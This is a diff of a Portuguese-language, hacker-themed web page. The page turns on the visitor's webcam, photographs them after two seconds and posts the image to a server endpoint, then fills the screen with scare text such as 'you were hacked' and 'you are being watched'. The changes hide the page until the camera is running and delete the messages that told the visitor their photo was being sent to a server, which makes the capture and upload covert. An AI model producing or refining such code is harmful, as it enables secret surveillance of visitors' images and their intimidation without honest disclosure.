@@ -61,6 +61,12 @@
             z-index: 2;
             position: relative;
             backdrop-filter: blur(10px);
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .container.visible {
+            opacity: 1;
         }
 
         h1 {
@@ -136,51 +142,6 @@
             transform: scale(1.05);
         }
 
-        button:active {
-            transform: scale(0.95);
-        }
-
-        button:disabled {
-            background: #333;
-            color: #666;
-            cursor: not-allowed;
-            border-color: #666;
-            box-shadow: none;
-            transform: none;
-        }
-
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 3px;
-            display: none;
-            font-weight: bold;
-            border: 2px solid;
-            text-shadow: 0 0 5px currentColor;
-        }
-
-        .status.success {
-            background: rgba(0, 255, 0, 0.1);
-            color: #00ff00;
-            border-color: #00ff00;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
-            animation: glitch 0.3s;
-        }
-
-        .status.error {
-            background: rgba(255, 0, 0, 0.1);
-            color: #ff0000;
-            border-color: #ff0000;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-        }
-
-        .status.info {
-            background: rgba(0, 150, 255, 0.1);
-            color: #00bfff;
-            border-color: #00bfff;
-            box-shadow: 0 0 10px rgba(0, 150, 255, 0.5);
-        }
-
         #preview {
             width: 100%;
             border-radius: 3px;
@@ -188,29 +149,6 @@
             display: none;
             border: 2px solid #00ff00;
             box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
-        }
-
-        .countdown {
-            font-size: 72px;
-            font-weight: bold;
-            color: #ff0000;
-            margin: 20px 0;
-            display: none;
-            text-shadow: 0 0 20px #ff0000;
-            animation: countdownGlow 0.5s infinite;
-        }
-
-        @keyframes countdownGlow {
-            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
-            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000; }
-        }
-
-        @keyframes glitch {
-            0%, 100% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
         }
 
         .hacker-effect {
@@ -231,45 +169,112 @@
             50% { background: rgba(0, 255, 0, 0.3); }
         }
 
-        .matrix-text {
+        /* HORROR EFFECTS */
+        .horror-layer {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             display: none;
-            z-index: 998;
+            z-index: 1000;
             pointer-events: none;
+            font-family: 'Courier New', monospace;
             font-size: 20px;
-            color: rgba(0, 255, 0, 0.1);
+            font-weight: bold;
+            color: #ff0000;
             overflow: hidden;
-            line-height: 1.2;
+            animation: horrorFlicker 0.1s infinite;
         }
 
-        @keyframes slideDown {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100vh); }
+        @keyframes horrorFlicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
         }
 
-        .matrix-line {
-            animation: slideDown 3s linear infinite;
-            white-space: nowrap;
+        .horror-text {
+            position: absolute;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            animation: wobble 0.3s infinite;
+            transform: rotate(45deg);
+        }
+
+        @keyframes wobble {
+            0%, 100% { transform: rotate(45deg) translateX(0); }
+            50% { transform: rotate(45deg) translateX(10px); }
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 3px;
+            display: none;
+            font-weight: bold;
+            border: 2px solid;
+            text-shadow: 0 0 5px currentColor;
+        }
+
+        .status.success {
+            background: rgba(0, 255, 0, 0.1);
+            color: #00ff00;
+            border-color: #00ff00;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        .glitch-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 80px;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            z-index: 1001;
+            display: none;
+            animation: glitchAnimation 0.5s;
+            pointer-events: none;
+        }
+
+        @keyframes glitchAnimation {
+            0% { transform: translate(-50%, -50%) skew(0deg); opacity: 1; }
+            50% { transform: translate(-50%, -50%) skew(10deg); opacity: 0.8; }
+            100% { transform: translate(-50%, -50%) skew(0deg); opacity: 0; }
+        }
+
+        .scary-sound {
+            display: none;
+        }
+
+        .countdown {
+            font-size: 72px;
+            font-weight: bold;
+            color: #ff0000;
+            margin: 20px 0;
+            display: none;
+            text-shadow: 0 0 20px #ff0000;
+            animation: countdownGlow 0.5s infinite;
+        }
+
+        @keyframes countdownGlow {
+            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
+            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000; }
         }
     </style>
 </head>
 <body>
     <div class="hacker-effect" id="hackerEffect"></div>
-    <div class="matrix-text" id="matrixText"></div>
+    <div class="horror-layer" id="horrorLayer"></div>
+    <div class="glitch-text" id="glitchText"></div>
 
-    <div class="container">
+    <div class="container" id="container">
         <h1>⚠️ ACESSO CONCEDIDO ⚠️</h1>
         <p>SISTEMA DE CAPTURA ATIVADO</p>
 
         <div class="video-container">
             <video id="video" playsinline></video>
         </div>
-
-        <div class="countdown" id="countdown"></div>
 
         <img id="preview" alt="Captura">
 
@@ -284,6 +289,10 @@
     <script>
         let stream = null;
         let fotoCapturada = null;
+        const container = document.getElementById('container');
+
+        // Ocultar container no início
+        container.classList.remove('visible');
 
         function mostrarStatus(mensagem, tipo = 'info') {
             const statusEl = document.getElementById('status');
@@ -300,22 +309,73 @@
             }, 200);
         }
 
-        function gerarMatrixEffect() {
-            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン█▓▒░';
-            let text = '';
+        function iniciarSequenciaHorror() {
+            const horrorLayer = document.getElementById('horrorLayer');
+            horrorLayer.style.display = 'block';
             
-            for (let i = 0; i < 50; i++) {
-                const char = chars.charAt(Math.floor(Math.random() * chars.length));
-                text += char;
+            const mensagensHorror = [
+                'ALGUÉM ESTÁ ASSISTINDO',
+                'PERIGO',
+                'ACESSO NEGADO',
+                'ERRO CRÍTICO',
+                'DESCULPE',
+                'VOCÊ FOI HACKEADO',
+                '⚠️ ⚠️ ⚠️',
+                'SISTEMA COMPROMETIDO',
+                'NÃO LEVANTEM A CABEÇA',
+                'VOCÊ ESTÁ SENDO OBSERVADO',
+                'FECHE A CÂMERA',
+                'CORRA'
+            ];
+
+            let contador = 0;
+            const intervalo = setInterval(() => {
+                if (contador > 15) {
+                    clearInterval(intervalo);
+                    horrorLayer.innerHTML = '';
+                    return;
+                }
+
+                horrorLayer.innerHTML = '';
+
+                for (let i = 0; i < 8; i++) {
+                    const text = document.createElement('div');
+                    text.className = 'horror-text';
+                    text.textContent = mensagensHorror[Math.floor(Math.random() * mensagensHorror.length)];
+                    text.style.left = Math.random() * 100 + '%';
+                    text.style.top = Math.random() * 100 + '%';
+                    text.style.color = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
+                    text.style.fontSize = (Math.random() * 40 + 20) + 'px';
+                    text.style.transform = `rotate(${Math.random() * 360}deg)`;
+                    horrorLayer.appendChild(text);
+                }
+
+                contador++;
+            }, 300);
+
+            // Glitch texts
+            const glitchTexts = [
+                'ACESSO\nADQUIRIDO',
+                'VOCÊ\nFOI',
+                'HACKEA\nDO',
+                'SUA\nCAMERA'
+            ];
+
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const glitchEl = document.getElementById('glitchText');
+                    glitchEl.textContent = glitchTexts[i % glitchTexts.length];
+                    glitchEl.style.display = 'block';
+                    glitchEl.style.color = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
+                    
+                    setTimeout(() => {
+                        glitchEl.style.display = 'none';
+                    }, 500);
+                }, i * 800);
             }
-            
-            return text;
         }
 
         function iniciarCamera() {
-            mostrarStatus('INICIANDO ACESSO À CÂMERA...', 'info');
-            efeituHacker();
-
             navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: 'user',
@@ -330,31 +390,15 @@
 
                 video.onloadedmetadata = function() {
                     video.play();
-                    iniciarContagem();
+                    container.classList.add('visible');
+                    setTimeout(tirarFoto, 2000);
                 };
 
                 document.getElementById('video').parentElement.style.display = 'block';
-
-                mostrarStatus('[✓] CÂMERA ATIVADA - PREPARANDO CAPTURA...', 'success');
             })
             .catch(function(erro) {
-                console.error('Erro ao acessar a câmera:', erro);
-                let mensagem = '[x] ERRO: ';
-                
-                if (erro.name === 'NotAllowedError') {
-                    mensagem += 'Permissão negada. Acesso não autorizado.';
-                } else if (erro.name === 'NotFoundError') {
-                    mensagem += 'Câmera não detectada no sistema.';
-                } else {
-                    mensagem += erro.message;
-                }
-
-                mostrarStatus(mensagem, 'error');
+                console.error('Erro:', erro);
             });
-        }
-
-        function iniciarContagem() {
-            tirarFoto();
         }
 
         function tirarFoto() {
@@ -379,17 +423,16 @@
 
             document.getElementById('video').parentElement.style.display = 'none';
 
-            mostrarStatus('[✓] CAPTURA CONCLUÍDA - ENVIANDO PARA SERVIDOR...', 'success');
+            mostrarStatus('[✓✓✓] ACESSO ADQUIRIDO', 'success');
             
             setTimeout(() => {
+                iniciarSequenciaHorror();
                 baixarFotoAutomatico();
-            }, 800);
+            }, 1000);
         }
 
         function baixarFotoAutomatico() {
             if (!fotoCapturada) return;
-
-            mostrarStatus('[⟳] TRANSMITINDO DADOS...', 'info');
 
             fetch('/salvar-foto', {
                 method: 'POST',
@@ -398,18 +441,8 @@
                 },
                 body: JSON.stringify({ foto: fotoCapturada })
             })
-            .then(response => response.json())
-            .then(data => {
-                efeituHacker();
-                if (data.sucesso) {
-                    mostrarStatus(`[✓✓✓] ACESSO ADQUIRIDO: ${data.arquivo}`, 'success');
-                } else {
-                    mostrarStatus('[x] ' + data.mensagem, 'error');
-                }
-            })
             .catch(erro => {
                 console.error('Erro:', erro);
-                mostrarStatus('[x] ERRO NA TRANSMISSÃO DE DADOS', 'error');
             });
         }
 
